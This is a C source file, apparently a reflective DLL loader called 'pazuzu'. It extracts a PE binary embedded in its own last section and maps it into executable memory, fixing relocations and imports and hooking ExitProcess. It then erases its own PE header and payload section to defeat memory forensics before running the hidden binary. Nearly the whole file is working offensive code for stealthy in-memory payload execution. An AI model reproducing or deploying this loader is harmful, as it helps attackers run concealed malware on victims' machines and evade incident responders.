
#include "ReflectiveLoader.h"

void pazuzu();
void set_sections(char * buffer, IMAGE_NT_HEADERS32 *nt_headers, void * baseBin);
void get_hookExit(int code);
void fillImportAddress(IMAGE_IMPORT_DESCRIPTOR descriptor, void * addr, HMODULE importedDLL);
void delta_reloc(void * addr, IMAGE_OPTIONAL_HEADER32  optionalHeader);
void build_IAT(void * addr, IMAGE_OPTIONAL_HEADER32 optionalHeader);
IMAGE_SECTION_HEADER * get_first_section_header(IMAGE_NT_HEADERS32 *ntheaders);
IMAGE_DOS_HEADER * get_mz_address();
IMAGE_NT_HEADERS32 * get_ntheader(IMAGE_DOS_HEADER *addr);
void delete_pe_header(IMAGE_DOS_HEADER *addr);
void delete_section(IMAGE_DOS_HEADER *addr);
char * get_binary_from_section();
void execute_binary(void *baseBin);
void clean_stuff();
void build_in_memory(char * buffer, IMAGE_NT_HEADERS32 *nt_headers);

void * addr_bin_mem = NULL;

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
	BOOL bReturnValue = TRUE;
	switch (dwReason)
	{
	case DLL_QUERY_HMODULE:
	case DLL_PROCESS_ATTACH:
		pazuzu();
		break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return bReturnValue;
}

void set_sections(char * buffer, IMAGE_NT_HEADERS32 *nt_headers, void * baseBin)
{
	char * bufferSection;
	char * binarySection;
	IMAGE_SECTION_HEADER *sectionHeader;

	// Copy headers 
	memcpy((void*)baseBin, (void *)buffer, (size_t)(*nt_headers).OptionalHeader.SizeOfHeaders);

	// Get a pointer to the first section header
	sectionHeader = (IMAGE_SECTION_HEADER*)((IMAGE_OPTIONAL_HEADER32 *)&(*nt_headers).OptionalHeader + 1);

	int index;

	// Allocate memory for each section
	for (index = 0; index < (*nt_headers).FileHeader.NumberOfSections; index++)
	{
		bufferSection = buffer + (*sectionHeader).PointerToRawData;
		binarySection = (char *)baseBin + (*sectionHeader).VirtualAddress;
		memcpy((void *)binarySection, (void *)bufferSection, (size_t)(*sectionHeader).SizeOfRawData);
		// Next sectionHeader
		sectionHeader = (IMAGE_SECTION_HEADER*)(sectionHeader + 1);
	}
}

void get_hookExit(int code)
{
	//Put you own code here. In this example just delete the pe header
	void delete_pe_header(IMAGE_DOS_HEADER *addr_bin_mem);

	ExitThread(code);
}

void fillImportAddress(IMAGE_IMPORT_DESCRIPTOR descriptor, void * addr, HMODULE importedDLL)
{
	int nOrdinals = 0;
	DWORD nFunctions = 0;
	DWORD nOrdinal = 0;
	IMAGE_IMPORT_BY_NAME *nameArray;
	char * routineNameAddress;
	IMAGE_THUNK_DATA32 *import_addr = (IMAGE_THUNK_DATA32*)((char *)addr + descriptor.FirstThunk);
	IMAGE_THUNK_DATA32 *import_name = (IMAGE_THUNK_DATA32*)((char *)addr + descriptor.OriginalFirstThunk);

	while ((*import_addr).u1.Function != 0) {
		if ((*import_name).u1.Ordinal & IMAGE_ORDINAL_FLAG32)
		{
			(*import_addr).u1.Function = (DWORD)GetProcAddress(importedDLL, (LPCSTR)MAKEINTRESOURCE((*import_name).u1.Ordinal));
			nOrdinals++;
		}
		else
		{
			nameArray = (IMAGE_IMPORT_BY_NAME *)(*import_addr).u1.AddressOfData;
			routineNameAddress = (char *)addr + (DWORD)(*nameArray).Name;

			if ((strstr(routineNameAddress, "ExitProcess") != NULL))
			{
				addr_bin_mem = addr;
				(*import_addr).u1.Function = (DWORD)&get_hookExit;
			}
			else
			{
				(*import_addr).u1.Function = (DWORD)GetProcAddress(importedDLL, (LPCSTR)routineNameAddress);
			}
			nFunctions++;
		}
		import_addr++;
		import_name++;
	}
}

/* Useful info:
https://github.com/stephenfewer/ReflectiveDLLInjection/blob/master/dll/src/ReflectiveLoader.c
The RootKit Arsenal Book (pag 433) */

void delta_reloc(void * addr, IMAGE_OPTIONAL_HEADER32  optionalHeader)
{
	DWORD pageAddress;
	DWORD num_reloc;
	DWORD index;

	DWORD delta = (DWORD)addr - optionalHeader.ImageBase;
	IMAGE_DATA_DIRECTORY dataDirectory = optionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	IMAGE_BASE_RELOCATION * tableEntry = (IMAGE_BASE_RELOCATION *)((char *)addr + dataDirectory.VirtualAddress);

	while ((*tableEntry).SizeOfBlock >0)
	{
		struct _RELOC_RECORD
		{
			WORD offset : 12;
			WORD type : 4;
		}*reloc;

		pageAddress = (DWORD)((char *)addr + (*tableEntry).VirtualAddress);

		/* Useful: Calculate the number of Reloc blocks after the _IMAGE_BASE_RELOCATION structure
		http://stackoverflow.com/questions/17436668/how-are-pe-base-relocations-build-up  */
		num_reloc = ((*tableEntry).SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);

		reloc = (_RELOC_RECORD*)((tableEntry)+1);
		for (index = 0; index<num_reloc; index++) {
			DWORD fAddr;
			DWORD fType;

			fAddr = pageAddress + reloc[index].offset;
			fType = reloc[index].type;

			if (fType == IMAGE_REL_BASED_HIGH)
			{
				*(WORD *)(fAddr) += HIWORD(delta);
			}
			else if (fType == IMAGE_REL_BASED_LOW)
			{
				*(WORD *)(fAddr) += LOWORD(delta);
			}
			else if (fType == IMAGE_REL_BASED_HIGHLOW)
			{
				*(DWORD *)(fAddr) += delta;
			}
		}

		tableEntry = (IMAGE_BASE_RELOCATION *)((char *)tableEntry + (*tableEntry).SizeOfBlock);
	}
}

void build_IAT(void * addr, IMAGE_OPTIONAL_HEADER32 optionalHeader)
{
	int index = 0;

	IMAGE_DATA_DIRECTORY dir = optionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	IMAGE_IMPORT_DESCRIPTOR * importDes = (IMAGE_IMPORT_DESCRIPTOR *)((char *)addr + dir.VirtualAddress);

	while (importDes[index].Characteristics != 0) {
		HMODULE dllAddress;
		char *nameDLL = (char *)addr + importDes[index].Name;
		dllAddress = LoadLibraryA((LPCSTR)nameDLL);
		fillImportAddress(importDes[index], addr, dllAddress);
		index++;
	}

}

IMAGE_SECTION_HEADER * get_first_section_header(IMAGE_NT_HEADERS32 *ntheaders)
{
	return (IMAGE_SECTION_HEADER*)((IMAGE_OPTIONAL_HEADER32 *)&(*ntheaders).OptionalHeader + 1);
}

IMAGE_DOS_HEADER * get_mz_address()
{
	// Get current page in memory
	char *addr = (char *)((INT)(&get_mz_address) & 0xFFFFF000);

	// MZ still present in Reflective DLL stub: http://www.harmonysecurity.com/files/HS-P005_ReflectiveDllInjection.pdf
	// The e_lfanew field in also safe and sound
	while (true)
	{
		if ((addr[0] == 'M') && (addr[1] == 'Z'))
		{
			break;
		}
		addr = addr - 4096;
	}
	return (IMAGE_DOS_HEADER *)addr;
}

IMAGE_NT_HEADERS32 * get_ntheader(IMAGE_DOS_HEADER *addr)
{
	return (IMAGE_NT_HEADERS32 *)((char *)addr + (addr->e_lfanew));
}

void delete_pe_header(IMAGE_DOS_HEADER *addr)
{

	IMAGE_NT_HEADERS32 * ntheaders = get_ntheader(addr);
	int n_sections = (*ntheaders).FileHeader.NumberOfSections;
	IMAGE_SECTION_HEADER *sectionHeader = get_first_section_header(ntheaders);
	int diff = (int)((char*)&sectionHeader[n_sections] - (char *)addr);
	DWORD old;
	VirtualProtect(addr, diff, PAGE_READWRITE, &old); // Not needed
	memset(addr, 0, diff);
}

void delete_section(IMAGE_DOS_HEADER *addr)
{
	IMAGE_NT_HEADERS32 * ntheaders = get_ntheader(addr);
	int n_sections = (*ntheaders).FileHeader.NumberOfSections;
	IMAGE_SECTION_HEADER *sectionHeader = get_first_section_header(ntheaders);
	void *last_section_addr = sectionHeader[n_sections - 1].VirtualAddress + (char*)addr;
	int last_section_size = sectionHeader[n_sections - 1].Misc.VirtualSize;
	DWORD old;
	VirtualProtect(last_section_addr, last_section_size, PAGE_READWRITE, &old); // Not needed
	memset(last_section_addr, 0, last_section_size);
}

char * get_binary_from_section()
{
	IMAGE_DOS_HEADER *addr = get_mz_address();
	IMAGE_NT_HEADERS32 * ntheaders = get_ntheader(addr);
	int n_sections = (*ntheaders).FileHeader.NumberOfSections;

	// Pointer first section Header
	IMAGE_SECTION_HEADER *sectionHeader = get_first_section_header(ntheaders);

	//Get payload added to the last section
	return (char *)(sectionHeader[n_sections - 1].VirtualAddress + (char*)addr);
}

void execute_binary(void *baseBin)
{
	IMAGE_NT_HEADERS32 *nt_headers = get_ntheader((IMAGE_DOS_HEADER *)baseBin);
	char * absoluteEntryPoint = (char *)baseBin + (*nt_headers).OptionalHeader.AddressOfEntryPoint;
	int(*func)();
	func = (int(*)())absoluteEntryPoint;
	(int)(*func)();
}

void clean_stuff()
{
	IMAGE_DOS_HEADER *addr = get_mz_address();
	delete_section(addr);
	delete_pe_header(addr);
}

void build_in_memory(char * buffer, IMAGE_NT_HEADERS32 *nt_headers)
{
	DWORD OldProtect;
	void * baseBin = NULL;
	DWORD nBytes = (*nt_headers).OptionalHeader.SizeOfImage;

	// Playing with VADs and volatility
	baseBin = VirtualAlloc(NULL, (SIZE_T)nBytes, MEM_COMMIT | MEM_RESERVE, PAGE_NOACCESS);
	VirtualProtect(baseBin, (SIZE_T)nBytes, PAGE_EXECUTE_READWRITE, &OldProtect);

	// Map the binary's sections
	set_sections(buffer, nt_headers, baseBin);

	// Fix displacements (delta difference) from the reloc section.
	delta_reloc(baseBin, (*nt_headers).OptionalHeader);
	build_IAT(baseBin, (*nt_headers).OptionalHeader);

	clean_stuff();

	// Execute binary
	execute_binary(baseBin);
}

void pazuzu()
{
	IMAGE_NT_HEADERS32 *nt_headers = NULL;
	char * buffer = NULL;

	// Get a pointer to the section containing the binary
	buffer = get_binary_from_section();

	// Pointer to the nt_header 
	nt_headers = get_ntheader((IMAGE_DOS_HEADER *)buffer);

	build_in_memory(buffer, nt_headers);

	ExitThread(0);
}